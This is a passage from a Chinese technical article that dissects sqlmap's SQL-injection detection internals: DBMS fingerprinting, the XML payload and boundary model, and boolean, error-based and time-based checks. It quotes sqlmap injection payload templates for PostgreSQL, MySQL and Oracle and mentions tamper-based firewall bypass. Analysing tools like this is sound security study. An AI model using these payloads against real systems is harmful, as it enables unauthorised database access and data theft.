等报错信息，这些信息是通过特定正则表达式来匹配检测的。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 checkSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数可以说是 sqlmap 中最核心的函数了。在这个函数中，处理了 Payload 的各种细节和测试用例的各种细节。&lt;/p&gt;&lt;p&gt;大致执行步骤分为如下几个大部分：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;根据已知参数类型筛选 boundary&lt;/li&gt;&lt;li&gt;启发式检测数据库类型 &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt;&lt;/li&gt;&lt;li&gt;payload 预处理（UNION）&lt;/li&gt;&lt;li&gt;过滤与排除不合适的测试用例&lt;/li&gt;&lt;li&gt;对筛选出的边界进行遍历与 payload 整合&lt;/li&gt;&lt;li&gt;payload 渲染&lt;/li&gt;&lt;li&gt;针对四种类型的注入分别进行 response 的响应和处理&lt;/li&gt;&lt;li&gt;得出结果，返回结果&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;下图是笔者折叠无关代码之后剩余的最核心的循环和条件分支，我们发现他关于 &lt;code class=&quot;inline&quot;&gt;injectable&lt;/code&gt; 的设置完全是通过 &lt;code class=&quot;inline&quot;&gt;if method == PAYLOAD.METHOD.[COMPARISON/GREP/TIME/UNION]&lt;/code&gt; 这几个条件分支去处理的，同时这些条件显然是 sqlmap 针对不同的注入类型的 Payload 进行自己的结果处理逻辑饿和判断逻辑。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1ff54b5a86ad202b1b2b0d770c262eb7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1774&quot; data-rawheight=&quot;1312&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1ff54b5a86ad202b1b2b0d770c262eb7&quot; data-watermark-src=&quot;v2-8fb80e21a653bfa7afbdc16fa7221498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;数据库类型检测 heuristicCheckDbms&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在本大节刚开始的时候，就已经说明了第二步是确定数据库的类型，那么数据库类型来源于用户设定或者自动检测，当截止第二步之前还没有办法确定数据库类型的时候，就会自动启动 &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt; 这个函数，利用一些简单的测试来确定数据库类型。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b1c6a11d5b3a8a023cf5a4444675e1d9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1229&quot; data-rawheight=&quot;652&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b1c6a11d5b3a8a023cf5a4444675e1d9&quot; data-watermark-src=&quot;v2-5c4556182c1195c912df953e4c08951f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其实这个步骤非常简单，核心原理是利用简单的布尔盲注构造一个 &lt;code class=&quot;inline&quot;&gt;(SELECT &quot;[RANDSTR]&quot; [FROM_DUMMY_TABLE.get(dbms)] )=&quot;[RANDSTR1]&quot;&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;(SELECT &#39;[RANDSTR]&#39; [FROM_DUMMY_TABLE.get(dbms)] )=&#39;[RANDSTR1]&#39;&lt;/code&gt; 这两个 Payload 的请求判断。其中&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;FROM_DUMMY_TABLE = {
    DBMS.ORACLE: &quot; FROM DUAL&quot;,
    DBMS.ACCESS: &quot; FROM MSysAccessObjects&quot;,
    DBMS.FIREBIRD: &quot; FROM RDB$DATABASE&quot;,
    DBMS.MAXDB: &quot; FROM VERSIONS&quot;,
    DBMS.DB2: &quot; FROM SYSIBM.SYSDUMMY1&quot;,
    DBMS.HSQLDB: &quot; FROM INFORMATION_SCHEMA.SYSTEM_USERS&quot;,
    DBMS.INFORMIX: &quot; FROM SYSMASTER:SYSDUAL&quot;
}&lt;/code&gt;&lt;p&gt;例如，检查是否是 ORACLE 的时候，就会生成 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
(SELECT &#39;abc&#39; FROM DUAL)=&#39;abc&#39; 
(SELECT &#39;abc&#39; FROM DUAL)=&#39;abcd&#39;&lt;/code&gt;&lt;p&gt;这样的两个 Payload，如果确实存在正负关系（具体内容参见后续章节的布尔盲注检测），则表明数据库就是 ORACLE。&lt;/p&gt;&lt;p&gt;当然数据库类型检测并不是必须的，因为 sqlmap 实际工作中，如果没有指定 DBMS 则会按照当前测试 Payload 的对应的数据库类型去设置。&lt;/p&gt;&lt;p&gt;实际上在各种 Payload 的执行过程中，会包含着一些数据库的推断信息(&lt;code class=&quot;inline&quot;&gt;&amp;lt;details&amp;gt;&lt;/code&gt;)，如果 Payload 成功执行，这些信息可以被顺利推断则数据库类型就可以推断出来。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;测试数据模型与 Payload 介绍&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在实际的代码中，&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; 是一个接近七百行的函数。当然其行为也并不是仅仅通过我们上面列出的步骤就可以完全概括的，其中涉及到了很多关于 Payload 定义中字段的操作。显然，直到现在我们都并不是特别了解一个 Payload 中存在着什么样的定义，当然也不会懂得这些操作对于这些字段到底有什么具体的意义。所以我们没有办法在不了解真正 Payload 的时候开始之后的步骤。&lt;/p&gt;&lt;p&gt;因此在本节中，我们会详细介绍关于具体测试 Payload 的数据模型，并且基于这些模型和源码分析 sqlmap 实际的行为，和 sql 注入原理的细节知识。   ·&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&amp;lt;test&amp;gt; 通用模型&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;关于通用模型其实在 sqlmap 中有非常详细的说明，位置在 &lt;code class=&quot;inline&quot;&gt;xml/payloads/boolean_blind.xml&lt;/code&gt; 中，我们把他们分隔开分别来讲解具体字段对应的代码的行为。&lt;/p&gt;&lt;p&gt;首先我们必须明白一个具体的 testcase 对应一个具体的 xml 元素是什么样子：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;&amp;lt;/payload&amp;gt;
        &amp;lt;comment&amp;gt;&amp;lt;/comment&amp;gt;
        &amp;lt;char&amp;gt;&amp;lt;/char&amp;gt;
        &amp;lt;columns&amp;gt;&amp;lt;/columns&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;comparison&amp;gt;&amp;lt;/comparison&amp;gt;
        &amp;lt;grep&amp;gt;&amp;lt;/grep&amp;gt;
        &amp;lt;time&amp;gt;&amp;lt;/time&amp;gt;
        &amp;lt;union&amp;gt;&amp;lt;/union&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;&amp;lt;/dbms&amp;gt;
        &amp;lt;dbms_version&amp;gt;&amp;lt;/dbms_version&amp;gt;
        &amp;lt;os&amp;gt;&amp;lt;/os&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;关于上面的一个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 标签内的元素都是实际上包含的不只是一个 Payload 还包含&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
Sub-tag: &amp;lt;title&amp;gt;
    Title of the test. 测试的名称，这些名称就是我们实际在测试的时候输出的日志中的内容&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-11a7571b205d2558989f6054596e05cb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;285&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11a7571b205d2558989f6054596e05cb&quot; data-watermark-src=&quot;v2-e0b5748a512d87cfb212898eb0a3b017&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;上图表示一个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 中的 title 会被输出作为调试信息。&lt;/p&gt;&lt;p&gt;除非必要的子标签，笔者将会直接把标注写在下面的代码块中，&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Sub-tag: &amp;lt;stype&amp;gt;
    SQL injection family type. 表示注入的类型。
​
    Valid values:
        1: Boolean-based blind SQL injection
        2: Error-based queries SQL injection
        3: Inline queries SQL injection
        4: Stacked queries SQL injection
        5: Time-based blind SQL injection
        6: UNION query SQL injection
​
Sub-tag: &amp;lt;level&amp;gt;
    From which level check for this test. 测试的级别
​
    Valid values:
        1: Always (&amp;lt;100 requests)
        2: Try a bit harder (100-200 requests)
        3: Good number of requests (200-500 requests)
        4: Extensive test (500-1000 requests)
        5: You have plenty of time (&amp;gt;1000 requests)
​
Sub-tag: &amp;lt;risk&amp;gt;
    Likelihood of a payload to damage the data integrity.这个选项表明对目标数据库的损坏程度，risk 最高三级，最高等级代表对数据库可能会有危险的•操作，比如修改一些数据，插入一些数据甚至删除一些数据。
​
    Valid values:
        1: Low risk
        2: Medium risk
        3: High risk
​
Sub-tag: &amp;lt;clause&amp;gt;
    In which clause the payload can work. 这个字段表明 &amp;lt;test&amp;gt; 对应的测试 Payload 适用于哪种类型的 SQL 语句。一般来说，很多语句并不一定非要特定 WHERE 位置的。
​
    NOTE: for instance, there are some payload that do not have to be
    tested as soon as it has been identified whether or not the
    injection is within a WHERE clause condition.
​
    Valid values:
        0: Always
        1: WHERE / HAVING
        2: GROUP BY
        3: ORDER BY
        4: LIMIT
        5: OFFSET
        6: TOP
        7: Table name
        8: Column name
        9: Pre-WHERE (non-query)
​
    A comma separated list of these values is also possible.&lt;/code&gt;&lt;p&gt;在上面几个子标签中，我们经常见的就是 &lt;code class=&quot;inline&quot;&gt;level/risk&lt;/code&gt; 一般来说，默认的 sqlmap 配置跑不出漏洞的时候，我们通常会启动更高级别 &lt;code class=&quot;inline&quot;&gt;(level=5/risk=3)&lt;/code&gt; 的配置项来启动更多的 payload。&lt;/p&gt;&lt;p&gt;接下来我们再分析下面的标签&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
Sub-tag: &amp;lt;where&amp;gt;
    Where to add our &#39;&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&#39; string.
​
    Valid values:
        1: Append the string to the parameter original value
        2: Replace the parameter original value with a negative random
            integer value and append our string
        3: Replace the parameter original value with our string
​
Sub-tag: &amp;lt;vector&amp;gt;
    The payload that will be used to exploit the injection point.
    这个标签只是大致说明 Payload 长什么样子，其实实际请求的 Payload 或者变形之前的 Payload 可能并不是这个 Payload，以 request 子标签中的 payload 为准。
​
Sub-tag: &amp;lt;request&amp;gt; 
    What to inject for this test.
    关于发起请求的设置与配置。在这些配置中，有一些是特有的，但是有一些是必须的，例如 payload 是肯定存在的，但是 comment 是不一定有的，char 和 columns 是只有 UNION 才存在
​
    Sub-tag: &amp;lt;payload&amp;gt;
        The payload to test for. 实际测试使用的 Payload
​
    Sub-tag: &amp;lt;comment&amp;gt;
        Comment to append to the payload, before the suffix.
​
    Sub-tag: &amp;lt;char&amp;gt; 只有 UNION 注入存在的字段
        Character to use to bruteforce number of columns in UNION
        query SQL injection tests.
​
    Sub-tag: &amp;lt;columns&amp;gt; 只有 UNION 注入存在的字段
        Range of columns to test for in UNION query SQL injection
        tests.
​
Sub-tag: &amp;lt;response&amp;gt;
    How to identify if the injected payload succeeded.
    由于 payload 的目的不一定是相同的，所以，实际上处理请求的方法也并不是相同的，具体的处理方法步骤，在我们后续的章节中有详细的分析。
​
    Sub-tag: &amp;lt;comparison&amp;gt; 
        针对布尔盲注的特有字段，表示对比和 request 中请求的结果。
        Perform a request with this string as the payload and compare
        the response with the &amp;lt;payload&amp;gt; response. Apply the comparison
        algorithm.
​
        NOTE: useful to test for boolean-based blind SQL injections.
​
    Sub-tag: &amp;lt;grep&amp;gt; 
        针对报错型注入的特有字段，使用正则表达式去匹配结果。
        Regular expression to grep for in the response body.
​
        NOTE: useful to test for error-based SQL injection.
​
    Sub-tag: &amp;lt;time&amp;gt;
        针对时间盲注
        Time in seconds to wait before the response is returned.
​
        NOTE: useful to test for time-based blind and stacked queries
        SQL injections.
​
    Sub-tag: &amp;lt;union&amp;gt;
        处理 UNION •注入的办法。
        Calls unionTest() function.
​
        NOTE: useful to test for UNION query (inband) SQL injection.
​
Sub-tag: &amp;lt;details&amp;gt;
    Which details can be infered if the payload succeed.
    如果 response 标签中的检测结果成功了，可以推断出什么结论？
​
    Sub-tags: &amp;lt;dbms&amp;gt;
        What is the database management system (e.g. MySQL).
​
    Sub-tags: &amp;lt;dbms_version&amp;gt;
        What is the database management system version (e.g. 5.0.51).
​
    Sub-tags: &amp;lt;os&amp;gt;
        What is the database management system underlying operating
        system.&lt;/code&gt;&lt;p&gt;在初步了解了基本的 Payload 测试数据模型之后，我们接下来进行详细的检测逻辑的细节分析，因为篇幅的原因，我们暂且只针对布尔盲注和时间盲注进行分析，&lt;/p&gt;&lt;h2&gt;&lt;b&gt;真正的 Payload&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在前面的介绍中发现了几个疑似 Payload 的字段，但是遗憾的是，上面的每一个 Payload 都不是真正的 Payload。实际 sqlmap 在处理的过程中，只要是从 &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; 中加载的 Payload，都是需要经过一些随机化和预处理，这些预处理涉及到的概念如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;：需要为原始 Payload 的前后添加“边界”。边界是一个神奇的东西，主要取决于当前“拼接”的 SQL 语句的上下文，常见上下文：注入位置是一个“整形”；注入位置需要单引号/双引号&lt;code class=&quot;inline&quot;&gt;(&#39;/&quot;)&lt;/code&gt;闭合边界；注入位置在一个括号语句中。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;--tamper&lt;/code&gt;：Tamper 是 sqlmap 中最重要的概念之一，也是 Bypass 各种防火墙的有力的武器。在 sqlmap 中，Tamper 的处理位于我们上一篇文章中的 &lt;code class=&quot;inline&quot;&gt;agent.queryPage()&lt;/code&gt; 中，具体位于其对 Payload 的处理。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;&quot;Render&quot;&lt;/code&gt;：当然这一个步骤在 sqlmap 中没有明显的概念进行对应，其主要是针对 Payload 中随机化的标签进行渲染和替换，例如：&lt;br&gt;&lt;br&gt;[INFERENCE] 这个标签通常被替换成一个等式，这个等式用于判断结果的正负`Positive/Negative`&lt;br&gt;[RANDSTR] 会被替换成随机字符串&lt;br&gt;[RANDNUM] 与 [RANDNUMn] •会被替换成不同的数字&lt;br&gt;[SLEEPTIME] 在时间盲注中会被替换为 SLEEP 的时间&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;所以，实际上从 &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; 中加载出来的 Payload 需要经过上面的处理才能真的算是处理完成。这个 Payload 才会在 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 的日志中输出出来，也就是我们 &lt;code class=&quot;inline&quot;&gt;sqlmap -v3&lt;/code&gt; 选项看到的最终 Payload。&lt;/p&gt;&lt;p&gt;在上面的介绍中，我们又提到了一个陌生的概念，&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;，并且做了相对简单的介绍，具体的 &lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;，我们在 &lt;code class=&quot;inline&quot;&gt;{sqlmap_dir}/xml/boundaries.xml&lt;/code&gt; 中可以找到：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;boundary&amp;gt;
    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt; 
    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
    &amp;lt;ptype&amp;gt;&amp;lt;/ptype&amp;gt;
    &amp;lt;prefix&amp;gt;&amp;lt;/prefix&amp;gt;
    &amp;lt;suffix&amp;gt;&amp;lt;/suffix&amp;gt;
&amp;lt;/boundary&amp;gt;&lt;/code&gt;&lt;p&gt;在具体的定义中，我们发现没见过的子标签如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
    Sub-tag: &amp;lt;ptype&amp;gt;
        What is the parameter value type. 参数•类型（参数边界上下文类型）
​
        Valid values:
            1: Unescaped numeric
            2: Single quoted string
            3: LIKE single quoted string
            4: Double quoted string
            5: LIKE double quoted string
​
    Sub-tag: &amp;lt;prefix&amp;gt;
        A string to prepend to the payload.
​
    Sub-tag: &amp;lt;suffix&amp;gt;
        A string to append to the payload.&lt;/code&gt;&lt;p&gt;其实到现在 sqlmap 中 Payload 的结构我们就非常清楚了&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;&amp;lt;prefix&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt; 来源于 &lt;code class=&quot;inline&quot;&gt;boundaries.xml&lt;/code&gt; 中，而 &lt;code class=&quot;inline&quot;&gt;&amp;lt;payload&amp;gt; &amp;lt;comment&amp;gt;&lt;/code&gt; 来源于本身 &lt;code class=&quot;inline&quot;&gt;xml/payloads/*.xml&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 中。在本节中都有非常详细的描述了&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对布尔盲注的检测&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在接下来的小节中，我们将会针对几种注入进行详细分析，我们的分析依据主要是 sqlmap 设定的 Payload 的数据模型和其本身的代码。本节先针对布尔盲注进行一些详细分析。&lt;/p&gt;&lt;p&gt;在分析之前，我们先看一个详细的 Payload:&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;1&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;3&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;3&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;1&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;2&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/payload&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;comparison&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/comparison&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;PostgreSQL&amp;lt;/dbms&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;根据上一节介绍的子标签的特性，我们可以大致观察这个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 会至少发送两个 Payload：第一个为 &lt;code class=&quot;inline&quot;&gt;request&lt;/code&gt; 标签中的 &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; 第二个为 &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; 标签中的 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 中的 Payload。&lt;/p&gt;&lt;p&gt;当然我们很容易想到，针对布尔盲注的检测实际上只需要检测 &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; 这两个请求，只要这两个请求页面不相同，就可以判定是存在问题的。可是事实真的如此吗？结果当然并没有这么简单。&lt;/p&gt;&lt;p&gt;我们首先定义 &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; 中的的请求为正请求 &lt;code class=&quot;inline&quot;&gt;Positive&lt;/code&gt;，对应 &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; 中的请求为负请求 &lt;code class=&quot;inline&quot;&gt;Negative&lt;/code&gt;，在 sqlmap 中原处理如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-889c61c0043a4bbae05fd30cecbbaac5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1478&quot; data-rawheight=&quot;762&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-889c61c0043a4bbae05fd30cecbbaac5&quot; data-watermark-src=&quot;v2-4264d6978637ad50c6159d8c55c8ca5d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在代码批注中我们进行详细的解释，为了让大家看得更清楚，我们把代码转变为流程图：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6e395260b8da555410426a857d7211f9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;825&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e395260b8da555410426a857d7211f9&quot; data-watermark-src=&quot;v2-1cfc26e92a86a341a395d991fb6cc5f5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中最容易被遗忘的可能并不是正负请求的对比，而是正请求与模版页面的对比，负请求与错误请求的对比和错误请求与模版页面的对比，因为广泛存在一种情况是类似文件包含模式的情况，不同的合理输入的结果有大概率不相同，且每一次输入的结果如果报错都会跳转到某一个默认页面（存在默认参数），这种情况仅仅用正负请求来区分页面不同是完全不够用的，还需要各种情形与模版页面的比较来确定。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对 GREP 型（报错注入）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;针对报错注入其实非常好识别，在报错注入检测的过程中，我们会发现他的 &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; 子标签中，包含着是 &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; 子标签：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;MySQL &amp;amp;gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;2&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;5&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;1&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;1,2,3,9&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;1&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,([QUERY]),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#39;[DELIMITER_START]&#39;,(SELECT (ELT([RANDNUM]=[RANDNUM],1))),&#39;[DELIMITER_STOP]&#39;)) USING utf8)))&amp;lt;/payload&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;grep&amp;gt;[DELIMITER_START](?P&amp;amp;lt;result&amp;amp;gt;.*?)[DELIMITER_STOP]&amp;lt;/grep&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;MySQL&amp;lt;/dbms&amp;gt;
        &amp;lt;dbms_version&amp;gt;&amp;amp;gt;= 5.7.8&amp;lt;/dbms_version&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;我们发现子标签 &lt;code class=&quot;inline&quot;&gt;grep&lt;/code&gt; 中是正则表达式，可以直接从整个请求中通过 grep 中的正则提取出对应的内容，如果成功提取出了对应内容，则说明该参数可以进行注入。&lt;/p&gt;&lt;p&gt;在具体代码中，其实非常直观可以看到：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dbdc68e369293fa89fd0683922aa541b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-dbdc68e369293fa89fd0683922aa541b&quot; data-watermark-src=&quot;v2-b46b7662e0a4c22eb8b9979bfed695eb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;再 sqlmap 的实现中其实并不是仅仅检查页面内容就足够的，除了页面内容之外，检查如下项：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTP 的错误页面&lt;/li&gt;&lt;li&gt;Headers 中的内容&lt;/li&gt;&lt;li&gt;重定向信息&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;针对 TIME 型（时间盲注，HeavilyQuery）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然时间盲注我们可以很容易猜到应该怎么处理：如果发出了请求导致延迟了 X 秒，并且响应延迟的时间是我们预期的时间，那么就可以判定这个参数是一个时间注入点。&lt;/p&gt;&lt;p&gt;但是仅仅是这样就可以了嘛？当然我们需要了解的是 sqlmap 如何设置这个 X 作为时间点（请看下面这个函数，位于 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 中）：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0291e85a6985aa5192c135f7356b8681_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1390&quot; data-rawheight=&quot;655&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0291e85a6985aa5192c135f7356b8681&quot; data-watermark-src=&quot;v2-22eec861df21fd6569007ffdf640ec21&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我们发现，它里面有一个数学概念：&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%A8%99%E6%BA%96%E5%B7%AE&quot;&gt;标准差&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;简单来说，标准差是一组数值自平均值分散开来的程度的一种测量观念。一个较大的标准差，代表大部分的数值和其平均值之间差异较大；一个较小的标准差，代表这些数值较接近平均值。例如，两组数的集合{0, 5, 9, 14}和{5, 6, 8, 9}其平均值都是7，但第二个集合具有较小的标准差。述“相差k个标准差”，即在 X̄ ± kS 的样本（Sample）范围内考量。标准差可以当作不确定性的一种测量。例如在物理科学中，做重复性测量时，测量数值集合的标准差代表这些测量的精确度。当要决定测量值是否符合预测值，测量值的标准差占有决定性重要角色：如果测量平均值与预测值相差太远（同时与标准差数值做比较），则认为测量值与预测值互相矛盾。这很容易理解，因为如果测量值都落在一定数值范围之外，可以合理推论预测值是否正确。&lt;/blockquote&gt;&lt;p&gt;根据注释和批注中的解释，我们发现我们需要设定一个最小 SLEEPTIME 应该至少大于 &lt;code class=&quot;inline&quot;&gt;样本内平均响应时间 + 7 * 样本标准差&lt;/code&gt;，这样就可以保证过滤掉 &lt;code class=&quot;inline&quot;&gt;99.99%&lt;/code&gt; 的无延迟请求。&lt;/p&gt;&lt;p&gt;当然除了这一点，我们还发现&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
delta = threadData.lastQueryDuration - conf.timeSec
if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):  # MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average
    delta += 0.05
